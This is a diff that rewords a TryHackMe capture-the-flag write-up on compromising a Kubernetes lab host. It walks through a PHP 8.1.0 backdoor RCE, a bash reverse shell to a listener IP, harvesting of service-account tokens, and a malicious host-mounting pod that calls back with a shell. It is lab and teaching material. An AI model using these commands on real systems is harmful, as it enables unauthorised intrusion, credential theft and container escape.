@@ -6,13 +6,13 @@ https://tryhackme.com/room/frankandherbytryagain
 
 ## Enumeration:
 
-I started my enumeration process with port & service scans using rustscan:
+To begin the enumeration process, I conducted port and service scans using Rustscan:
 
 ```bash
 sudo rustscan -a 10.10.175.146 -- -sC -sV -vv -oN result_nmap
 ```
 
-Rustscan revealed multiple ports open & running in the environment:
+Rustscan identified several open ports within the environment.
 
 ```Rust
 PORT      STATE SERVICE     REASON         VERSION
@@ -289,7 +289,7 @@ PORT      STATE SERVICE     REASON         VERSION
 |_http-title: FRANK RULEZZ!
 ```
 
-I checked all the port manually:
+I proceeded to manually inspect each port:
 
 - Port 22: SSH
 - Port 10250: microk8s
@@ -309,12 +309,11 @@ I checked all the port manually:
 
 ### Initial access:
 
-In all the above discovered port I observed that the port 30679 is running PHP server with version 8.1.0. 
-I searched for the exploit & found a RCE on exploit-db:
+Upon inspecting the discovered ports, I noticed that port 30679 is running a PHP server with version 8.1.0. I searched for potential exploits and found a Remote Code Execution (RCE) exploit on exploit-db.
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/1b2ec74f-2717-445a-9135-5439d775d096)
 
-Using this exploit I observed that I am able to execute the commands on the PHP host:
+Utilizing this exploit, I confirmed that I could execute commands on the PHP host:
 
 ```bash
 python3 php-exploit.py
@@ -325,7 +324,7 @@ hostname
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/b7bf4de3-7856-4738-b35b-781008aefa80)
 
-Finally I executed the bash reverse shell & got a connection back on my netcat listener:
+Subsequently, I initiated a bash reverse shell, successfully establishing a connection on my netcat listener:
 
 ```bash
 bash -c "bash -i >& /dev/tcp/10.6.79.71/8443 0>&1"
@@ -333,8 +332,7 @@ bash -c "bash -i >& /dev/tcp/10.6.79.71/8443 0>&1"
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/f319a4b6-2e1d-4975-bbb7-24ae87066c6b)
 
-I got the reverse shell as root but doing some manual enumeration it looks like I am inside a virtual environment.
-Further enumeration revealed that I am inside a kubernetes pod:
+Although I gained a reverse shell as root, further manual exploration indicated that I was inside a virtual environment. Upon additional investigation, it became evident that I was within a Kubernetes pod:
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/9375898e-6afd-4fce-972b-d8f81b68a749)
 
@@ -342,22 +340,21 @@ Further enumeration revealed that I am inside a kubernetes pod:
 
 ## K8s:
 
-To get the user flag & escape the virtual environment I pefromed some manual enumeration for the certificates & token taking reference from [Hacktrickz cloud](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-enumeration).
-As per the blog I can find secrets & token in below locations:
+To obtain the user flag and escape the virtual environment, I performed manual enumeration for certificates and tokens. I referred to [Hacktrickz Cloud](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-enumeration) to identify potential locations for secrets and tokens. According to the blog, these can be found in the following directories:
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/ab97a5e6-1586-4113-a4cf-e31b1170e8f9)
 
-When checked on these location I found the certificate, namespaces & token inside "/var/run/secrets/kubernetes.io/serviceaccount" directory:
+Upon checking these locations, I found certificates, namespaces, and tokens inside the "**/var/run/secrets/kubernetes.io/serviceaccount**" directory:
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/53ecef96-2277-4818-a532-55fbabb7b495)
 
-These certificates & token belongs to "frankland" namespace, which is mentioned inside the namespace file.
+These certificates and tokens belong to the "frankland" namespace, as indicated in the namespace file.
 
-I copied these certificate & token to my localhost for the further authentication remotely and also exported the token value to the environment variable to avoid the copy pasting.
+I copied these certificate and token files to my localhost for further authentication and also exported the token value to the environment variable to avoid manual copy-pasting:
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/068b6f0d-c86e-4908-a3be-97bb6cb64d11)
 
-I used [Kubeletctl](https://github.com/cyberark/kubeletctl) to check for the pods & namespaces in the target host, this also showed me a POD namespace with "frankland".
+I used [Kubeletctl](https://github.com/cyberark/kubeletctl) to check for pods and namespaces on the target host. This also showed a POD namespace named "frankland":
 
 ```bash
 kubeletctl pods -s 10.10.32.152 --http --port 10255
@@ -365,8 +362,7 @@ kubeletctl pods -s 10.10.32.152 --http --port 10255
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/f1bfd298-7300-45b5-acb3-cdca2a965d23)
 
-
-I did some more enumeration in this POD to checked if I can list or create new POD in the kubernertes:
+Further enumeration within this POD allowed me to check if I could list or create new PODs in the Kubernetes cluster:
 
 ```bash
 kubectl --server https://10.10.32.152:16443 --certificate-authority=ca.crt --token=$token auth can-i --list -n frankland  #Get privileves in custnamespace
@@ -380,15 +376,14 @@ kubectl --server https://10.10.32.152:16443 --certificate-authority=ca.crt --tok
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/a2985248-308d-4831-b962-1ee75cdc0580)
 
-By enumerating through the POD in the **frankland** namespace it looks like I have the privilege to create a new POD with the already available image. To leverage this I checked further details of the frankland in YAML format to get the image name.
+By exploring the POD in the **frankland** namespace, it seems that I have the privilege to create a new POD with an already available image. To leverage this, I checked further details of the "frankland" namespace in YAML format to obtain the image name:
 
 ```bash
 kubectl --server https://10.10.32.152:16443 --certificate-authority=ca.crt --token=$token get pod php-deploy-6d998f68b9-wlslz -n frankland -o yaml #list the POD details in yaml format.
 ```
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/facfffde-166b-4cef-86ba-6aa3b1e02bcf)
 
-From this POD details I got the image names as : ```vulhub/php:8.1-backdoor```, using the image name I created a new malicious YAML file which will mount the '/' folder in '/mnt' directory & also connect back to the netcat listener.
-My final YAML file was something looking like this:
+From this POD details, I obtained the image name as **vulhub/php:8.1-backdoor**. Using the image name, I created a new malicious YAML file that would mount the '/' folder in '/mnt' directory and also connect back to the netcat listener. My final YAML file looked like this:
 
 ```yaml
 apiVersion: v1
@@ -413,11 +408,11 @@ spec:
   hostNetwork: true
 ```
 
-Once the yaml file was ready I pushed it for the creation & in few momemnt once the POD was created from my yaml file, I received a reverse shell in my listener:
+Once the YAML file was ready, I pushed it for creation. After a few moments, once the POD was created from my YAML file, I received a reverse shell in my listener:
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/ad50751d-eeb7-42c4-9c27-385c8bc6b2b5)
 
-Although I received the reverse shell but I still confirmed my POD creation using kubeletctl which listed my malicious POD in the list:
+Although I received the reverse shell, I confirmed my POD creation using kubeletctl, which listed my malicious POD in the output:
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/1146036d-5640-4209-b377-b3176b2b7312)
 
@@ -425,7 +420,7 @@ Although I received the reverse shell but I still confirmed my POD creation usin
 
 ### Flags:
 
-Once I got the reverse shell I moved into the **/mnt** folder which is having all the files from the root host. Where I got the user flag in **/home/herby** folder & root flag in the **/root** folder.
+After gaining access through the reverse shell, I navigated to the **/mnt** directory, which contains files from the root host. In the process, I located the user flag within the **/home/herby** folder and the root flag within the **/root** directory.
 
 **User flag:**
 
